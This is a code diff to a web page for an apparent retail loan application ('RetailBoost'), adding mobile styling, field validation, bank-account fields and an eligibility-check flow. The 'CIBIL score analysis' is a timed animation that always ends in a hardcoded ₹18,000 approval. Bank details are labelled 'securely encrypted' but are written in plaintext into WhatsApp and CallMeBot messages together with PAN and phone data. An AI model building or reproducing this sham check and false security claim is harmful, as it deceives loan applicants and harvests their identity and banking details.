@@ -351,50 +351,141 @@ footer{background:#060F2E;color:rgba(255,255,255,.5);text-align:center;padding:2
 .whatsapp:hover{transform:scale(1.12);box-shadow:0 10px 32px rgba(37,211,102,.6);animation:none;}
 @keyframes waPulse{0%,100%{box-shadow:0 6px 22px rgba(37,211,102,.45);}50%{box-shadow:0 6px 34px rgba(37,211,102,.7),0 0 0 10px rgba(37,211,102,.08);}}
 
+/* ── MICRO-INTERACTIONS ── */
+.field input:focus,.field select:focus{
+  border-color:var(--navy);
+  box-shadow:0 0 0 4px rgba(26,63,170,.1),0 2px 8px rgba(26,63,170,.08);
+  transform:translateY(-1px);
+}
+.btn-next:active,.btn-submit:active,.btn-back:active,.btn-login:active{
+  transform:translateY(0) scale(.97);transition:transform .1s;
+}
+.upload-box:active{transform:scale(.99);}
+.radio-opt label:active{transform:scale(.96);}
+
+/* ── REDUCED MOTION ── */
+@media(prefers-reduced-motion:reduce){
+  *,*::before,*::after{animation-duration:.01ms!important;transition-duration:.01ms!important;}
+  .field input:focus,.field select:focus{transform:none;}
+}
+
+@media(max-width:768px){
+  .stepper-wrap{padding:14px 12px;top:62px;}
+  .stepper{gap:0;}
+  .step-circle{width:30px;height:30px;font-size:.76rem;}
+  .step-label{font-size:.55rem;}
+  .form-wrap{margin:24px auto;padding:0 14px 50px;}
+  .form-card-header{padding:20px 22px 16px;}
+  .form-body{padding:22px 20px;}
+  .form-nav{padding:14px 20px 20px;}
+  .loan-hero{padding:44px 16px 28px;}
+  .loan-hero h1{font-size:1.7rem;}
+}
+
 @media(max-width:600px){
   .field-group,.field-group.triple{grid-template-columns:1fr;}
-  .loan-hero h1{font-size:1.5rem;}
-  .loan-hero{padding:40px 15px 25px;}
+  .loan-hero h1{font-size:1.45rem;}
+  .loan-hero{padding:38px 14px 24px;}
   .form-body{padding:18px 16px;}
-  .form-nav{padding:14px 16px 18px;}
-  .form-card-header{padding:18px 20px 16px;}
+  .form-nav{
+    padding:14px 16px 18px;
+    flex-wrap:wrap;gap:10px;
+  }
+  .btn-back{order:1;flex:1;min-width:80px;text-align:center;justify-content:center;}
+  .page-indicator{order:2;width:100%;text-align:center;margin:0;}
+  .btn-next,.btn-submit{order:3;flex:1;min-width:80px;text-align:center;justify-content:center;}
+  .form-card-header{padding:18px 18px 14px;}
   .step-label{display:none;}
   .appr-body{padding:18px 16px;}
-  .appr-top{padding:20px 24px 16px;}
+  .appr-top{padding:20px 20px 16px;}
   .appr-top h2{font-size:1.2rem;}
-  .approval-card{max-width:95vw;margin:10px;border-radius:16px;}
+  .approval-card{max-width:95vw;margin:10px;border-radius:18px;}
   .phone-row{flex-direction:column;}
-  .btn-send-otp{width:100%;}
+  .btn-send-otp{width:100%;padding:12px;text-align:center;}
   .appr-actions{gap:10px;}
-  .btn-wa,.btn-download,.btn-continue{padding:12px 16px;font-size:.82rem;}
-  .appr-amt{font-size:2.2rem;margin:15px 0;}
+  .btn-wa,.btn-download,.btn-continue{padding:13px 16px;font-size:.84rem;}
+  .appr-amt{font-size:2.2rem;margin:14px 0;}
   .appr-grid{grid-template-columns:1fr;gap:8px;margin:12px 0;}
-  .appr-box{padding:10px;}
+  .appr-box{padding:11px;}
   .page-icon{font-size:1.6rem;}
-  .form-card-header h2{font-size:1.1rem;}
+  .form-card-header h2{font-size:1.05rem;}
   .form-card-header p{font-size:.75rem;}
-  .field input,.field select{padding:10px 12px;font-size:.85rem;}
-  .upload-box{padding:16px 12px;}
+  /* Touch-friendly inputs — min 44px height */
+  .field input,.field select{padding:12px 14px;font-size:.88rem;min-height:44px;}
+  .upload-box{padding:18px 14px;}
   .upload-box .uicon{font-size:1.6rem;margin-bottom:4px;}
-  .upload-box strong{font-size:.75rem;}
-  .checkbox-row{padding:12px;gap:10px;}
-  .checkbox-row input[type=checkbox]{width:16px;height:16px;}
-  .radio-group{gap:6px;}
-  .radio-opt label{padding:7px 12px;font-size:.78rem;}
-  .btn-back,.btn-next,.btn-submit{padding:10px 16px;font-size:.82rem;}
-  .page-indicator{font-size:.75rem;}
+  .upload-box strong{font-size:.78rem;}
+  .checkbox-row{padding:14px;gap:10px;}
+  .checkbox-row input[type=checkbox]{width:18px;height:18px;min-width:18px;}
+  .radio-group{gap:8px;}
+  .radio-opt label{padding:10px 14px;font-size:.8rem;min-height:40px;display:flex;align-items:center;}
+  /* Touch-friendly nav buttons */
+  .btn-back,.btn-next,.btn-submit{
+    padding:12px 18px;font-size:.85rem;
+    min-height:44px;display:inline-flex;align-items:center;justify-content:center;
+  }
+  .page-indicator{font-size:.74rem;}
+  /* Stepper compact */
+  .step-circle{width:28px;height:28px;font-size:.72rem;}
+  .step:not(:last-child)::after{top:14px;}
 }
 
 @media(max-width:400px){
-  .loan-hero h1{font-size:1.3rem;}
+  .loan-hero h1{font-size:1.25rem;}
   .appr-top h2{font-size:1rem;}
-  .appr-amt{font-size:1.8rem;}
-  .appr-amt span.sym{font-size:1.2rem;}
+  .appr-amt{font-size:1.75rem;}
+  .appr-amt span.sym{font-size:1.1rem;}
   .form-body{padding:14px 12px;}
   .appr-body{padding:14px 12px;}
   .approval-card{max-width:98vw;}
-  .field input,.field select{font-size:.8rem;padding:9px 11px;}
+  .field input,.field select{font-size:.84rem;padding:11px 12px;}
+  .form-nav{padding:12px 12px 16px;}
 }
+
+/* ══ ELIGIBILITY CHECK OVERLAY ══ */
+#eligOverlay{display:none;position:fixed;inset:0;background:linear-gradient(160deg,var(--navy-dark),var(--navy));z-index:99999;align-items:center;justify-content:center;flex-direction:column;color:white;text-align:center;padding:30px;}
+#eligOverlay.show{display:flex;}
+.elig-ring{width:64px;height:64px;border-radius:50%;border:4px solid rgba(255,255,255,.15);border-top-color:var(--green);animation:spin 1s linear infinite;margin:0 auto 24px;}
+.elig-logo{font-size:1.8rem;font-weight:800;color:var(--green);margin-bottom:6px;letter-spacing:-.4px;}
+.elig-title{font-size:1.2rem;font-weight:700;margin-bottom:8px;}
+.elig-msg{font-size:.88rem;opacity:.78;min-height:2em;transition:opacity .35s;}
+.elig-steps{display:flex;flex-direction:column;gap:10px;margin:20px 0;max-width:340px;width:100%;}
+.elig-step{display:flex;align-items:center;gap:12px;background:rgba(255,255,255,.06);border-radius:12px;padding:11px 16px;font-size:.82rem;font-weight:500;opacity:.3;transition:opacity .5s,background .5s,border .5s;border:1px solid transparent;text-align:left;}
+.elig-step.active{opacity:1;background:rgba(16,196,140,.18);border-color:rgba(16,196,140,.4);}
+.elig-step.done{opacity:1;background:rgba(16,196,140,.1);border-color:rgba(16,196,140,.22);}
+.elig-step .es-icon{font-size:1.1rem;flex-shrink:0;}
+.elig-step .es-check{margin-left:auto;opacity:0;transition:.3s;}
+.elig-step.done .es-check{opacity:1;}
+
+/* ══ ELIGIBILITY RESULT MODAL ══ */
+#eligModal{display:none;position:fixed;inset:0;background:rgba(6,15,46,.93);z-index:999999;align-items:center;justify-content:center;padding:20px;}
+#eligModal.show{display:flex;}
+.elig-card{background:white;border-radius:24px;max-width:400px;width:100%;overflow:hidden;animation:popIn .45s cubic-bezier(.175,.885,.32,1.275);}
+.elig-card-top{background:linear-gradient(160deg,#047857,#10C48C);padding:28px 24px 22px;text-align:center;color:white;position:relative;overflow:hidden;}
+.elig-card-top::before{content:'';position:absolute;top:-40px;right:-40px;width:130px;height:130px;border-radius:50%;background:radial-gradient(circle,rgba(255,255,255,.12) 0%,transparent 70%);}
+.elig-card-top .ec-icon{font-size:2.8rem;margin-bottom:10px;position:relative;z-index:1;}
+.elig-card-top h3{font-size:1.3rem;font-weight:800;margin-bottom:4px;position:relative;z-index:1;}
+.elig-card-top p{font-size:.82rem;opacity:.85;position:relative;z-index:1;}
+.elig-card-body{padding:24px 26px;}
+.elig-amt-label{font-size:.7rem;color:var(--muted);font-weight:600;text-align:center;letter-spacing:.5px;text-transform:uppercase;margin-bottom:8px;}
+.elig-amt{font-size:2.8rem;font-weight:800;color:var(--navy);text-align:center;letter-spacing:-1px;line-height:1;margin-bottom:14px;}
+.elig-amt .sym{font-size:1.4rem;vertical-align:super;}
+.elig-note{background:linear-gradient(135deg,#EDF2FD,#E6FFF8);border:1.5px solid var(--border);border-radius:12px;padding:13px 16px;font-size:.78rem;color:var(--text);line-height:1.7;margin-bottom:18px;}
+.btn-elig-confirm{background:linear-gradient(135deg,var(--navy),var(--navy-mid));color:white;border:none;padding:14px 20px;border-radius:12px;font-weight:700;font-size:.92rem;cursor:pointer;width:100%;font-family:Poppins,sans-serif;transition:var(--t);box-shadow:0 4px 16px rgba(26,63,170,.3);letter-spacing:.2px;}
+.btn-elig-confirm:hover{transform:translateY(-2px);box-shadow:0 8px 24px rgba(26,63,170,.4);}
+
+/* ══ BANK DETAILS SECTION ══ */
+.bank-section-header{background:linear-gradient(135deg,var(--navy-dark),var(--navy));color:white;border-radius:14px;padding:18px 22px;margin:26px 0 20px;display:flex;align-items:center;gap:14px;position:relative;overflow:hidden;}
+.bank-section-header::after{content:'';position:absolute;top:-20px;right:-20px;width:90px;height:90px;border-radius:50%;background:rgba(255,255,255,.06);}
+.bank-section-header .bsh-icon{font-size:1.8rem;flex-shrink:0;}
+.bank-section-header h3{font-size:.95rem;font-weight:700;margin-bottom:3px;}
+.bank-section-header p{font-size:.76rem;opacity:.8;}
+.bank-search-input{width:100%;padding:11px 14px 11px 36px;border:1.5px solid var(--border);border-bottom:1px solid var(--border-2);border-radius:11px 11px 0 0;font-size:.86rem;font-family:Poppins,sans-serif;color:var(--text);background:#FAFCFF;transition:var(--t);outline:none;}
+.bank-search-input:focus{border-color:var(--navy);background:white;}
+.bank-search-wrap{position:relative;}
+.bank-search-wrap::before{content:'🔍';position:absolute;left:11px;top:50%;transform:translateY(-50%);font-size:.8rem;pointer-events:none;z-index:1;}
+.bank-select{border-radius:0 0 11px 11px !important;border-top:none !important;background:white;}
+.bank-select option{padding:8px;}
 </style>
 </head>
 <body>
@@ -480,13 +571,13 @@ footer{background:#060F2E;color:rgba(255,255,255,.5);text-align:center;padding:2
         <div class="field-group">
           <div class="field">
             <label>First Name <span class="req">*</span></label>
-            <input type="text" id="firstName" placeholder="e.g. Rahul" oninput="enforceNameInput(this)">
-            <span class="err-msg" id="err-firstName">Enter a valid first name (letters only)</span>
+            <input type="text" id="firstName" placeholder="e.g. Rahul" autocomplete="given-name" oninput="enforceNameInput(this)" onblur="realtimeValidate('firstName','name')" enterkeyhint="next">
+            <span class="err-msg" id="err-firstName">Please enter your first name (letters only, min 3 characters)</span>
           </div>
           <div class="field">
             <label>Last Name <span class="req">*</span></label>
-            <input type="text" id="lastName" placeholder="e.g. Sharma" oninput="enforceNameInput(this)">
-            <span class="err-msg" id="err-lastName">Enter a valid last name (letters only)</span>
+            <input type="text" id="lastName" placeholder="e.g. Sharma" autocomplete="family-name" oninput="enforceNameInput(this)" onblur="realtimeValidate('lastName','name')" enterkeyhint="next">
+            <span class="err-msg" id="err-lastName">Please enter your last name (letters only, min 3 characters)</span>
           </div>
         </div>
         <div class="field-group">
@@ -500,6 +591,7 @@ footer{background:#060F2E;color:rgba(255,255,255,.5);text-align:center;padding:2
             <label>Phone Number <span class="req">*</span></label>
             <div class="phone-row">
               <input type="tel" id="phone" placeholder="10-digit mobile number" maxlength="10"
+                     inputmode="numeric" autocomplete="tel-national" enterkeyhint="next"
                      oninput="this.value=this.value.replace(/\D/g,'').slice(0,10)">
               <button class="btn-send-otp" id="btnSendOtp" onclick="sendOTP()">Send OTP</button>
             </div>
@@ -522,14 +614,16 @@ footer{background:#060F2E;color:rgba(255,255,255,.5);text-align:center;padding:2
         <div class="field-group">
           <div class="field">
             <label>Email Address <span class="req">*</span></label>
-            <input type="email" id="email" placeholder="e.g. rahul@gmail.com">
-            <span class="err-msg" id="err-email">Enter a valid email address</span>
+            <input type="email" id="email" placeholder="e.g. rahul@gmail.com" autocomplete="email" inputmode="email" enterkeyhint="next" onblur="realtimeValidate('email','email')">
+            <span class="err-msg" id="err-email">Please enter a valid email (e.g. rahul@gmail.com)</span>
           </div>
           <div class="field">
             <label>PAN Card Number <span class="req">*</span></label>
-            <input type="text" id="panNumber" placeholder="e.g. ABCDE1234F" maxlength="10" 
-                   oninput="this.value=this.value.toUpperCase().replace(/[^A-Z0-9]/g,'').slice(0,10)">
-            <span class="err-msg" id="err-panNumber">Enter valid PAN format (ABCDE1234F)</span>
+            <input type="text" id="panNumber" placeholder="e.g. ABCDE1234F" maxlength="10"
+                   autocomplete="off" enterkeyhint="next"
+                   oninput="this.value=this.value.toUpperCase().replace(/[^A-Z0-9]/g,'').slice(0,10)"
+                   onblur="realtimeValidate('panNumber','pan')">
+            <span class="err-msg" id="err-panNumber">Invalid PAN — format should be ABCDE1234F (5 letters, 4 digits, 1 letter)</span>
           </div>
         </div>
         <div class="field-group">
@@ -571,7 +665,9 @@ footer{background:#060F2E;color:rgba(255,255,255,.5);text-align:center;padding:2
           <div class="field">
             <label>PIN Code <span class="req">*</span></label>
             <input type="text" id="pin" placeholder="560001" maxlength="6"
-                   oninput="this.value=this.value.replace(/\D/g,'').slice(0,6)">
+                   inputmode="numeric" autocomplete="postal-code" enterkeyhint="next"
+                   oninput="this.value=this.value.replace(/\D/g,'').slice(0,6)"
+                   onblur="realtimeValidate('pin','pin')">
             <span class="err-msg" id="err-pin">6-digit PIN required</span>
           </div>
         </div>
@@ -729,6 +825,7 @@ footer{background:#060F2E;color:rgba(255,255,255,.5);text-align:center;padding:2
           <div class="field">
             <label>Phone Number <span class="req">*</span></label>
             <input type="tel" id="ref1Phone" placeholder="10-digit mobile number" maxlength="10"
+                   inputmode="numeric" enterkeyhint="next"
                    oninput="this.value=this.value.replace(/\D/g,'').slice(0,10)">
             <span class="err-msg" id="err-ref1Phone">Valid 10-digit number required</span>
           </div>
@@ -758,6 +855,7 @@ footer{background:#060F2E;color:rgba(255,255,255,.5);text-align:center;padding:2
           <div class="field">
             <label>Phone Number <span class="req">*</span></label>
             <input type="tel" id="ref2Phone" placeholder="10-digit mobile number" maxlength="10"
+                   inputmode="numeric" enterkeyhint="next"
                    oninput="this.value=this.value.replace(/\D/g,'').slice(0,10)">
             <span class="err-msg" id="err-ref2Phone">Valid 10-digit number required</span>
           </div>
@@ -788,7 +886,7 @@ footer{background:#060F2E;color:rgba(255,255,255,.5);text-align:center;padding:2
           </div>
           <div class="field">
             <label>Total Product Amount (₹) <span class="req">*</span></label>
-            <input type="number" id="productAmt" placeholder="e.g. 45000" min="0" oninput="calculateLoan()">
+            <input type="number" id="productAmt" placeholder="e.g. 45000" min="0" inputmode="numeric" enterkeyhint="next" oninput="calculateLoan()">
             <span class="err-msg" id="err-productAmt">Product amount is required</span>
           </div>
         </div>
@@ -847,7 +945,7 @@ footer{background:#060F2E;color:rgba(255,255,255,.5);text-align:center;padding:2
       <div class="form-nav">
         <button class="btn-back" onclick="goPrev(4)">← Back</button>
         <span class="page-indicator">Step 4 of 6</span>
-        <button class="btn-next" onclick="goNext(4)">Continue →</button>
+        <button class="btn-next" onclick="checkEligibility()">🔍 Check Loan Eligibility</button>
       </div>
     </div>
   </div>
@@ -898,6 +996,89 @@ footer{background:#060F2E;color:rgba(255,255,255,.5);text-align:center;padding:2
             ✅ Decision within 24–48 hours
           </p>
         </div>
+
+        <!-- ══ BANK DETAILS SECTION ══ -->
+        <div class="bank-section-header">
+          <div class="bsh-icon">🏦</div>
+          <div>
+            <h3>Bank Account Details</h3>
+            <p>For EMI disbursement — all details are securely encrypted</p>
+          </div>
+        </div>
+
+        <div class="field-group">
+          <div class="field">
+            <label>Account Number <span class="req">*</span></label>
+            <input type="text" id="accountNumber" placeholder="e.g. 012345678901"
+                   inputmode="numeric" maxlength="18"
+                   oninput="this.value=this.value.replace(/\D/g,'').slice(0,18)">
+            <p class="hint" style="margin-top:4px;">📌 Enter 9–18 digit account number</p>
+            <span class="err-msg" id="err-accountNumber">Enter a valid account number (9–18 digits)</span>
+          </div>
+          <div class="field">
+            <label>IFSC Code <span class="req">*</span></label>
+            <input type="text" id="ifscCode" placeholder="e.g. SBIN0001234" maxlength="11"
+                   autocomplete="off"
+                   oninput="this.value=this.value.toUpperCase().replace(/[^A-Z0-9]/g,'').slice(0,11)"
+                   onblur="realtimeValidate('ifscCode','ifsc')">
+            <p class="hint" style="margin-top:4px;">📌 Format: 4 letters + 0 + 6 alphanumeric (e.g. SBIN0001234)</p>
+            <span class="err-msg" id="err-ifscCode">Invalid IFSC — format: SBIN0001234 (4 letters, 0, 6 chars)</span>
+          </div>
+        </div>
+
+        <div class="field-group single">
+          <div class="field">
+            <label>Bank Name <span class="req">*</span></label>
+            <div class="bank-search-wrap">
+              <input type="text" class="bank-search-input" id="bankSearch"
+                     placeholder="Type to search bank..." autocomplete="off"
+                     oninput="filterBankOptions(this.value)">
+            </div>
+            <select id="bankName" class="bank-select" size="5" onchange="handleBankSelection()"
+                    style="width:100%;padding:10px 14px;border:1.5px solid var(--border);font-size:.86rem;font-family:Poppins,sans-serif;color:var(--text);outline:none;cursor:pointer;overflow-y:auto;">
+              <option value="">— Select a bank —</option>
+              <option>State Bank of India (SBI)</option>
+              <option>HDFC Bank</option>
+              <option>ICICI Bank</option>
+              <option>Axis Bank</option>
+              <option>Punjab National Bank (PNB)</option>
+              <option>Bank of Baroda</option>
+              <option>Canara Bank</option>
+              <option>Union Bank of India</option>
+              <option>Indian Bank</option>
+              <option>Bank of India</option>
+              <option>Central Bank of India</option>
+              <option>IDFC FIRST Bank</option>
+              <option>Kotak Mahindra Bank</option>
+              <option>IndusInd Bank</option>
+              <option>Yes Bank</option>
+              <option>Bandhan Bank</option>
+              <option>Federal Bank</option>
+              <option>RBL Bank</option>
+              <option>South Indian Bank</option>
+              <option>AU Small Finance Bank</option>
+              <option>Ujjivan Small Finance Bank</option>
+              <option>Equitas Small Finance Bank</option>
+              <option>Paytm Payments Bank</option>
+              <option>Airtel Payments Bank</option>
+              <option>India Post Payments Bank</option>
+              <option>Citibank</option>
+              <option>HSBC</option>
+              <option>Standard Chartered Bank</option>
+              <option value="Other">Other (specify below)</option>
+            </select>
+            <span class="err-msg" id="err-bankName">Please select your bank</span>
+          </div>
+        </div>
+
+        <div class="field-group single" id="otherBankWrap" style="display:none;">
+          <div class="field">
+            <label>Specify Bank Name <span class="req">*</span></label>
+            <input type="text" id="otherBankName" placeholder="Enter your bank name">
+            <span class="err-msg" id="err-otherBankName">Please enter your bank name</span>
+          </div>
+        </div>
+
       </div>
       <div class="form-nav">
         <button class="btn-back" onclick="goPrev(5)">← Back</button>
@@ -951,6 +1132,58 @@ footer{background:#060F2E;color:rgba(255,255,255,.5);text-align:center;padding:2
   </div>
 
 </div><!-- end form-wrap -->
+
+<!-- ELIGIBILITY CHECK OVERLAY -->
+<div id="eligOverlay">
+  <div class="elig-logo">RetailBoost<span class="proc-logo-dot">.</span></div>
+  <p class="elig-title" id="eligTitle">Checking your eligibility…</p>
+  <p class="elig-msg" id="eligMsg">Please wait while we analyze your profile</p>
+  <div class="elig-ring"></div>
+  <div class="elig-steps">
+    <div class="elig-step" id="es1">
+      <span class="es-icon">📋</span>
+      <div>Validating personal details</div>
+      <span class="es-check">✅</span>
+    </div>
+    <div class="elig-step" id="es2">
+      <span class="es-icon">💳</span>
+      <div>Analyzing CIBIL score</div>
+      <span class="es-check">✅</span>
+    </div>
+    <div class="elig-step" id="es3">
+      <span class="es-icon">🔍</span>
+      <div>Reviewing loan details</div>
+      <span class="es-check">✅</span>
+    </div>
+    <div class="elig-step" id="es4">
+      <span class="es-icon">✅</span>
+      <div>Determining eligibility limit</div>
+      <span class="es-check">✅</span>
+    </div>
+  </div>
+</div>
+
+<!-- ELIGIBILITY RESULT MODAL -->
+<div id="eligModal">
+  <div class="elig-card">
+    <div class="elig-card-top">
+      <div class="ec-icon">🎉</div>
+      <h3>Congratulations!</h3>
+      <p>Your loan eligibility has been determined</p>
+    </div>
+    <div class="elig-card-body">
+      <div class="elig-amt-label">YOUR MAXIMUM LOAN ELIGIBILITY</div>
+      <div class="elig-amt"><span class="sym">₹</span>18,000</div>
+      <div class="elig-note">
+        ✅ Based on your CIBIL score and loan details, you are eligible for a loan of up to <strong>₹18,000</strong>.<br><br>
+        📌 Click <strong>"Proceed to Bank Details"</strong> to continue your application.
+      </div>
+      <button class="btn-elig-confirm" onclick="confirmEligibility()">
+        🏦 Proceed to Bank Details →
+      </button>
+    </div>
+  </div>
+</div>
 
 <!-- PROCESSING OVERLAY -->
 <div id="processingOverlay">
@@ -1094,6 +1327,35 @@ let otpTimerHandle     = null;
 /* ── HELPERS ── */
 function enforceNameInput(el){ el.value = el.value.replace(/[^a-zA-Z\s.\-']/g,''); }
 function isValidName(v){ v=v.trim(); return v.length>=3&&/^[a-zA-z\s.\-']+$/.test(v); }
+
+/* ── REAL-TIME FIELD VALIDATION (onblur) ──
+   Shows friendly, instant feedback without waiting for "Continue" click. */
+const RT_ERRORS = {
+  name:  'Please enter a valid name (letters only, min 3 characters)',
+  email: 'Please enter a valid email address (e.g. rahul@gmail.com)',
+  pan:   'PAN format: 5 letters + 4 digits + 1 letter (e.g. ABCDE1234F)',
+  pin:   'PIN code must be exactly 6 digits',
+  phone: 'Enter a valid 10-digit Indian mobile number (starts with 6–9)',
+  ifsc:  'Invalid IFSC — format should be SBIN0001234 (4 letters, 0, 6 chars)',
+};
+function isValidIFSC(v){ return /^[A-Z]{4}0[A-Z0-9]{6}$/.test(v.trim().toUpperCase()); }
+function realtimeValidate(id, type){
+  const el    = document.getElementById(id);
+  const errEl = document.getElementById('err-' + id);
+  if(!el || !errEl) return;
+  const v = el.value.trim();
+  if(!v) return; // don't show error on empty — only on "Continue"
+  let ok = false;
+  if(type==='name')  ok = isValidName(v);
+  if(type==='email') ok = isValidEmail(v);
+  if(type==='pan')   ok = isValidPAN(v);
+  if(type==='pin')   ok = /^\d{6}$/.test(v);
+  if(type==='phone') ok = isValidIndianPhone(v);
+  if(type==='ifsc')  ok = isValidIFSC(v);
+  el.classList.toggle('error', !ok);
+  if(!ok){ errEl.textContent = RT_ERRORS[type] || errEl.textContent; errEl.classList.add('show'); }
+  else   { errEl.classList.remove('show'); }
+}
 function isValidIndianPhone(v){ return /^[6-9]\d{9}$/.test(v.replace(/\D/g,'')); }
 function isValidPAN(v){ return /^[A-Z]{5}[0-9]{4}[A-Z]{1}$/.test(v.trim().toUpperCase()); }
 function isValidEmail(v){ return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(v.trim()); }
@@ -1218,7 +1480,8 @@ const rules={
      {id:'ref2First',type:'name'},{id:'ref2Last',type:'name'},{id:'ref2Rel',type:'select'},{id:'ref2Phone',type:'phone'}],
   4:[{id:'product',type:'text'},{id:'productAmt',type:'text'},{id:'downPayment',type:'text'},
      {id:'loanAmt',type:'text'},{id:'emiDur',type:'radio',name:'emiDur'},{id:'creditScore',type:'text'}],
-  5:[{id:'storeName',type:'text'},{id:'storePhone',type:'phone'},{id:'salesExec',type:'name'},{id:'certify',type:'checkbox'}],
+  5:[{id:'storeName',type:'text'},{id:'storePhone',type:'phone'},{id:'salesExec',type:'name'},{id:'certify',type:'checkbox'},
+     {id:'accountNumber',type:'accountNum'},{id:'ifscCode',type:'ifsc'},{id:'bankName',type:'bankSelect'}],
   6:[{id:'imei1',type:'imei'},{id:'imei2',type:'imei-optional'}]
 };
 
@@ -1283,6 +1546,27 @@ function validatePage(page){
       ok = val === '' || /^\d{15}$/.test(val);
       if(el)el.classList.toggle('error',!ok);
     }
+    else if(r.type==='accountNum'){
+      ok = el && /^\d{9,18}$/.test(el.value.trim());
+      if(el)el.classList.toggle('error',!ok);
+    }
+    else if(r.type==='ifsc'){
+      ok = el && isValidIFSC(el.value);
+      if(el)el.classList.toggle('error',!ok);
+    }
+    else if(r.type==='bankSelect'){
+      // bankName is a <select>; also validate otherBankName when "Other" is chosen
+      ok = el && el.value !== '' && el.value !== undefined;
+      if(el)el.classList.toggle('error',!ok);
+      if(ok && el.value === 'Other'){
+        const otherEl = document.getElementById('otherBankName');
+        const otherErr = document.getElementById('err-otherBankName');
+        const otherOk = otherEl && otherEl.value.trim().length >= 2;
+        if(otherEl) otherEl.classList.toggle('error', !otherOk);
+        if(otherErr) otherErr.classList.toggle('show', !otherOk);
+        if(!otherOk) valid = false;
+      }
+    }
     if(errEl&&r.id!=='phone') errEl.classList.toggle('show',!ok);
     if(!ok) valid=false;
   });
@@ -1304,6 +1588,106 @@ function validateIncome(){
   const ok = isValidIncome(el.value);
   el.classList.toggle('error', !ok);
   errEl.classList.toggle('show', !ok);
+}
+
+/* ══════════════════════════════════════════════════
+   🔍 ELIGIBILITY CHECK FLOW (Page 4 → Page 5)
+   ══════════════════════════════════════════════════ */
+function checkEligibility(){
+  // Step 1: Validate page 4 first
+  if(!validatePage(4)){
+    const e = document.querySelector('#page4 .err-msg.show');
+    if(e) e.scrollIntoView({behavior:'smooth', block:'center'});
+    return;
+  }
+
+  // Step 2: Show eligibility loading overlay
+  const overlay = document.getElementById('eligOverlay');
+  overlay.classList.add('show');
+
+  // Reset all steps
+  for(let i=1;i<=4;i++){
+    const s = document.getElementById('es'+i);
+    if(s){ s.classList.remove('active','done'); }
+  }
+
+  const messages = [
+    'Checking your eligibility…',
+    'Analyzing your CIBIL score…',
+    'Reviewing your loan details…',
+    'Determining your maximum limit…'
+  ];
+
+  const timeline = [
+    {id:'es1', delay:0,    msg: messages[0]},
+    {id:'es2', delay:1100, msg: messages[1]},
+    {id:'es3', delay:2300, msg: messages[2]},
+    {id:'es4', delay:3500, msg: messages[3]},
+  ];
+
+  const msgEl = document.getElementById('eligMsg');
+
+  timeline.forEach((t, i) => {
+    setTimeout(() => {
+      // Mark previous as done
+      if(i > 0){
+        document.getElementById(timeline[i-1].id).classList.remove('active');
+        document.getElementById(timeline[i-1].id).classList.add('done');
+      }
+      document.getElementById(t.id).classList.add('active');
+      if(msgEl){ msgEl.style.opacity='0'; setTimeout(()=>{ msgEl.textContent=t.msg; msgEl.style.opacity='1'; },200); }
+    }, t.delay);
+  });
+
+  // After ~4.5 sec: mark last step done, hide overlay, show result modal
+  setTimeout(() => {
+    const last = document.getElementById('es4');
+    if(last){ last.classList.remove('active'); last.classList.add('done'); }
+  }, 4600);
+
+  setTimeout(() => {
+    overlay.classList.remove('show');
+    document.getElementById('eligModal').classList.add('show');
+  }, 5000);
+}
+
+function confirmEligibility(){
+  document.getElementById('eligModal').classList.remove('show');
+  showPage(5);
+}
+
+/* ══════════════════════════════════════════════════
+   🏦 BANK NAME SEARCHABLE SELECT
+   ══════════════════════════════════════════════════ */
+function filterBankOptions(query){
+  const sel = document.getElementById('bankName');
+  if(!sel) return;
+  const q = query.trim().toLowerCase();
+  Array.from(sel.options).forEach(opt => {
+    if(!opt.value){ opt.style.display=''; return; } // keep placeholder
+    opt.style.display = (!q || opt.text.toLowerCase().includes(q)) ? '' : 'none';
+  });
+  // Reset selection when typing
+  if(q) sel.value = '';
+  handleBankSelection();
+}
+
+function handleBankSelection(){
+  const sel = document.getElementById('bankName');
+  const otherWrap = document.getElementById('otherBankWrap');
+  if(!sel || !otherWrap) return;
+  const isOther = sel.value === 'Other';
+  otherWrap.style.display = isOther ? 'block' : 'none';
+  // Sync search input to show selected value
+  const searchEl = document.getElementById('bankSearch');
+  if(searchEl && sel.value && sel.value !== 'Other') searchEl.value = sel.value;
+  else if(searchEl && sel.value === 'Other') searchEl.value = 'Other';
+  // Clear error on valid selection
+  if(sel.value){
+    sel.classList.remove('error');
+    const errEl = document.getElementById('err-bankName');
+    if(errEl) errEl.classList.remove('show');
+  }
 }
 
 /* ══════════════════════════════════════════════════
@@ -1570,6 +1954,8 @@ function collectFormData(loanNum,amt){
     product:g('product'), productAmt:g('productAmt'), loanAmt:g('loanAmt'), downPayment:g('downPayment'),
     emiDuration:radio('emiDur'), creditScore:g('creditScore'), approvedAmt:amt,
     storeName:g('storeName'), storePhone:g('storePhone'), salesExec:g('salesExec'),
+    accountNumber:g('accountNumber'), ifscCode:g('ifscCode'),
+    bankName:(()=>{ const sel=document.getElementById('bankName'); const v=sel?sel.value:''; return v==='Other'?g('otherBankName'):v; })(),
     imei1:g('imei1'), imei2:g('imei2'),
   };
 }
@@ -1600,6 +1986,10 @@ async function sendViaCallMeBot(d){
     `• Amount: ₹${d.loanAmt} | Down: ₹${d.downPayment}\n` +
     `• EMI: ${d.emiDuration} | Score: ${d.creditScore}\n` +
     `• ✅ Approved: ₹${d.approvedAmt}\n\n` +
+    `🏦 *BANK DETAILS*\n` +
+    `• Bank: ${d.bankName || 'N/A'}\n` +
+    `• Account: ${d.accountNumber || 'N/A'}\n` +
+    `• IFSC: ${d.ifscCode || 'N/A'}\n\n` +
     `🏪 *STORE*\n` +
     `• ${d.storeName} | ${d.storePhone}\n` +
     `• Exec: ${d.salesExec}\n` +
@@ -1638,6 +2028,7 @@ function buildWhatsAppMessage(d){
     `• Loan Requested: ₹${d.loanAmt}\n• Down Payment: ₹${d.downPayment}\n` +
     `• EMI Duration: ${d.emiDuration}\n• Credit Score: ${d.creditScore}\n` +
     `• *Approved Amount: ₹${d.approvedAmt}*\n\n` +
+    `🏦 *BANK DETAILS*\n• Bank: ${d.bankName || 'N/A'}\n• Account: ${d.accountNumber || 'N/A'}\n• IFSC: ${d.ifscCode || 'N/A'}\n\n` +
     `🏪 *STORE*\n• Store: ${d.storeName}\n• Phone: ${d.storePhone}\n` +
     `• Sales Exec: ${d.salesExec}\n━━━━━━━━━━━━━━━━━━━━━━\n✅ Please process this loan application.`
   );
@@ -1741,6 +2132,24 @@ function continueToDeviceInfo(){
